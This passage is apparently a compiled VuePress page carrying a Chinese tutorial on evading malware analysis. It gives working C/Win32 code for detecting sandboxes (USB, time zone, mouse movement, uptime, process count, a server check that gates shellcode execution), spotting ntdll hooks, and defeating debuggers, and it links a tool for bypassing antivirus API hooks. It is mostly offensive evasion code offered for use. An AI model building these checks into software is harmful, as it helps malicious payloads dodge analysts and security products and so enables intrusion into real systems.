("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br")])]),e("h3",{attrs:{id:"usb存储检测"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#usb存储检测"}},[s._v("#")]),s._v(" USB存储检测")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('HKEY hKey;\nDWORD mountedUSBDevicesCount;\nRegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\\\ControlSet001\\\\Enum\\\\USBSTOR", 0, KEY_READ, &hKey);\nRegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);\nif (mountedUSBDevicesCount < 1) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("h3",{attrs:{id:"时区检测"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#时区检测"}},[s._v("#")]),s._v(" 时区检测")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('SetThreadLocale(MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), SORT_DEFAULT));\nDYNAMIC_TIME_ZONE_INFORMATION dynamicTimeZoneInfo;\nGetDynamicTimeZoneInformation(&dynamicTimeZoneInfo);\nwchar_t timeZoneName[128 + 1];\nStringCchCopyW(timeZoneName, 128, dynamicTimeZoneInfo.TimeZoneKeyName);\nCharUpperW(timeZoneName);\nif (!wcsstr(timeZoneName, L"CENTRAL EUROPEAN STANDARD TIME")) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br")])]),e("h3",{attrs:{id:"语言检测"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#语言检测"}},[s._v("#")]),s._v(" 语言检测")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("h2",{attrs:{id:"检测自动化分析"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#检测自动化分析"}},[s._v("#")]),s._v(" 检测自动化分析")]),s._v(" "),e("h3",{attrs:{id:"网络连接"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络连接"}},[s._v("#")]),s._v(" 网络连接")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);\nHINTERNET hConnection = WinHttpConnect(hSession, L"my.domain.or.ip", INTERNET_DEFAULT_HTTP_PORT, 0);\nHINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);\nWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);\nBOOL status = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);\nif (!status) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("p",[s._v("收到特定resp 执行shellcode")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);\nHINTERNET hConnection = WinHttpConnect(hSession, L"my.domain.or.ip", INTERNET_DEFAULT_HTTP_PORT, 0);\nHINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);\nWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);\nWinHttpReceiveResponse(hRequest, 0);\nDWORD responseLength;\nWinHttpQueryDataAvailable(hRequest, &responseLength);\nPVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);\nWinHttpReadData(hRequest, response, responseLength, &responseLength);\nif (atoi((PSTR)response) != 1337) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br")])]),e("h3",{attrs:{id:"用户交互"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#用户交互"}},[s._v("#")]),s._v(" 用户交互")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("POINT currentMousePosition;\nPOINT previousMousePosition;\nGetCursorPos(&previousMousePosition);\ndouble mouseDistance = 0;\nwhile (true)\n{\n\tGetCursorPos(&currentMousePosition);\n\tmouseDistance += sqrt(\n\t\tpow(currentMousePosition.x - previousMousePosition.x, 2) +\n\t\tpow(currentMousePosition.y - previousMousePosition.y, 2)\n\t);\n\tSleep(100);\n\tpreviousMousePosition = currentMousePosition;\n\tif (mouseDistance > 20000) break;\n}\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br")])]),e("h3",{attrs:{id:"最近文档数目"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#最近文档数目"}},[s._v("#")]),s._v(" 最近文档数目")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("PWSTR recentFolder = NULL;\nSHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);\nwchar_t recentFolderFiles[MAX_PATH + 1] = L\"\";\nStringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);\nStringCbCatW(recentFolderFiles, MAX_PATH, L\"\\\\*\");\nint numberOfRecentFiles = 0;\nWIN32_FIND_DATAW findFileData;\nHANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData);\nif (hFind != INVALID_HANDLE_VALUE)\n{\n\tdo\n\t{\n\t\tnumberOfRecentFiles++;\n\t} while (FindNextFileW(hFind, &findFileData));\n}\nif (numberOfRecentFiles >= 2) numberOfRecentFiles-=2; //exclude '.' and '..'\nif (numberOfRecentFiles < 20) return false;\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br")])]),e("h3",{attrs:{id:"进程数"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#进程数"}},[s._v("#")]),s._v(" 进程数")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("DWORD runningProcessesIDs[1024];\nDWORD runningProcessesCountBytes;\nDWORD runningProcessesCount;\nEnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);\nrunningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);\nif (runningProcessesCount < 50) return false;\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("h3",{attrs:{id:"系统运行时间"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#系统运行时间"}},[s._v("#")]),s._v(" 系统运行时间")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("ULONGLONG uptime = GetTickCount64() / 1000;\nif (uptime < 1200) return false; //20 minutes\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("h3",{attrs:{id:"延迟执行"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#延迟执行"}},[s._v("#")]),s._v(" 延迟执行")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('ULONGLONG uptimeBeforeSleep = GetTickCount64();\ntypedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);\nPNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");\nLARGE_INTEGER delay;\ndelay.QuadPart = -10000 * 100000; // 100 seconds\npNtDelayExecution(FALSE, &delay);\nULONGLONG uptimeAfterSleep = GetTickCount64();\nif ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("h3",{attrs:{id:"内核用户共享数据"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#内核用户共享数据"}},[s._v("#")]),s._v(" 内核用户共享数据")]),s._v(" "),e("blockquote",[e("p",[s._v("一些复杂的沙箱可能会同时钩住两个Sleep功能（甚至是内核模式ZwDelayExecution；但是，我认为如今，内核钩子需要管理程序级别的访问）和GetTickCount64（或内核模式KeQueryTickCount）。我们可以使用KUSER_SHARED_DATA系统内核与用户模式（当然是只读模式）共享的结构，其中包含有关“滴答计数”的信息。这种结构它始终位于存储器（0x7ffe0000）中的同一地址。实际的系统正常运行时间（KSYSTEM_TIME结构）存储在偏移量0x320中。我们可以从系统的内存中读取它，并用来检查与滴答计数相关的功能是否被沙箱操纵：(谷歌翻译)")])]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Sleep(1000000);\nULONG *PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;\nLONG *PUserSharedData_High1Time = (PLONG)0x7ffe0324;\nULONG *PUserSharedData_LowPart = (PULONG)0x7ffe0320;\nDWORD time = GetTickCount64();\nDWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +\n\t((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);\nif ((time - kernelTime) > 100 && (kernelTime - time) > 100) return false;\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("h3",{attrs:{id:"函数hook"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#函数hook"}},[s._v("#")]),s._v(" 函数Hook")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('// manually load the dll\nHANDLE dllFile = CreateFileW(L"C:\\\\Windows\\\\System32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\nDWORD dllFileSize = GetFileSize(dllFile, NULL);\nHANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\nHANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);\nCloseHandle(dllFile);\n\n// analyze the dll\nPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;\nPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);\nPIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader);\nPIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\nPULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);\nPULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);\nPUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);\n\n// find the original function code\nPVOID pNtCreateThreadExOriginal = NULL;\nfor (int i = 0; i < pExportDirectory->NumberOfNames; ++i)\n{\n\tPCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);\n\tif (!strcmp(pFunctionName, "NtCreateThreadEx"))\n\t{\n\t\tpNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);\n\t\tbreak;\n\t}\n}\n\n// compare functions\nPVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");\nif (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br")])]),e("h2",{attrs:{id:"直接系统调用绕过-av-apihook"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#直接系统调用绕过-av-apihook"}},[s._v("#")]),s._v(" 直接系统调用绕过 AV-ApiHook")]),s._v(" "),e("p",[s._v("https://github.com/jthuraisamy/SysWhispers/")]),s._v(" "),e("h2",{attrs:{id:"反调试"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#反调试"}},[s._v("#")]),s._v(" 反调试")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("if (IsDebuggerPresent()) return;\n\t\n// same check\nPPEB pPEB = (PPEB)__readgsqword(0x60);\nif (pPEB->BeingDebugged) return;\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('BOOL isDebuggerPresent = FALSE;\nCheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);\nif (isDebuggerPresent) return;\n\n// same check\ntypedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(IN  HANDLE, IN  PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);\nPNtQueryInformationProcess pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");\nDWORD64 isDebuggerPresent2 = 0;\npNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &isDebuggerPresent2, sizeof DWORD64, NULL);\nif (isDebuggerPresent2) return;\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br")])]),e("h3",{attrs:{id:"通过检查代码中的更改来检测断点"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#通过检查代码中的更改来检测断点"}},[s._v("#")]),s._v(" 通过检查代码中的更改来检测断点")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('#pragma comment(linker, "/INCREMENTAL:YES")\n\nDWORD CalculateFunctionChecksum(PUCHAR functionStart, PUCHAR functionEnd)\n{\n\tDWORD checksum = 0;\n\twhile(functionStart < functionEnd)\n\t{\n\t\tchecksum += *functionStart;\n\t\tfunctionStart++;\n\t}\n\treturn checksum;\n}\n#pragma auto_inline(off)\nVOID CrucialFunction()\n{\n\tint x = 0;\n\tx += 2;\n}\nVOID AfterCrucialFunction()\n{\n};\n#pragma auto_inline(on)\n\nvoid main()\n{\n\tDWORD originalChecksum = 3429;\n\tDWORD checksum = CalculateFunctionChecksum((PUCHAR)CrucialFunction, (PUCHAR)AfterCrucialFunction);\n\tif (checksum != originalChecksum) return;\n\t\n\twprintf_s(L"Now hacking...\\n");\n}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br")])]),e("h3",{attrs:{id:"通过检查内存页权限来检测断点"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#通过检查内存页权限来检测断点"}},[s._v("#")]),s._v(" 通过检查内存页权限来检测断点")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('BOOL debugged = false;\n\nPSAPI_WORKING_SET_INFORMATION workingSetInfo;\nQueryWorkingSet(GetCurrentProcess(), &workingSetInfo, sizeof workingSetInfo);\nDWORD requiredSize = sizeof PSAPI_WORKING_SET_INFORMATION * (workingSetInfo.NumberOfEntries + 20);\nPPSAPI_WORKING_SET_INFORMATION pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(0, requiredSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\nBOOL s = QueryWorkingSet(GetCurrentProcess(), pWorkingSetInfo, requiredSize);\nfor (int i = 0; i < pWorkingSetInfo->NumberOfEntries; i++)\n{\n\tPVOID physicalAddress = (PVOID)(pWorkingSetInfo->WorkingSetInfo[i].VirtualPage * 4096);\n\tMEMORY_BASIC_INFORMATION memoryInfo;\n\tVirtualQuery((PVOID)physicalAddress, &memoryInfo, sizeof memoryInfo);\n\tif (memoryInfo.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))\n\t{\n\t\tif ((pWorkingSetInfo->WorkingSetInfo[i].Shared == 0) || (pWorkingSetInfo->WorkingSetInfo[i].ShareCount == 0))\n\t\t{\n\t\t\tdebugged = true;\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nif (debugged) return;\n\nwprintf_s(L"Now hacking...\\n");\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br")])]),e("h3",{attrs:{id:"异常处理程序检测调试"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#异常处理程序检测调试"}},[s._v("#")]),s._v(" 异常处理程序检测调试")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('BOOL isDebugged = TRUE;\n\nLONG WINAPI CustomUnhandledExceptionFilter(PEXCEPTION_POINTERS pExceptionPointers)\n{\n\tisDebugged = FALSE;\n\treturn EXCEPTION_CONTINUE_EXECUTION;\n}\n\nvoid main()\n{\n\tPTOP_LEVEL_EXCEPTION_FILTER previousUnhandledExceptionFilter = SetUnhandledExceptionFilter(CustomUnhandledExceptionFilter);\n\tRaiseException(EXCEPTION_FLT_DIVIDE_BY_ZERO, 0, 0, 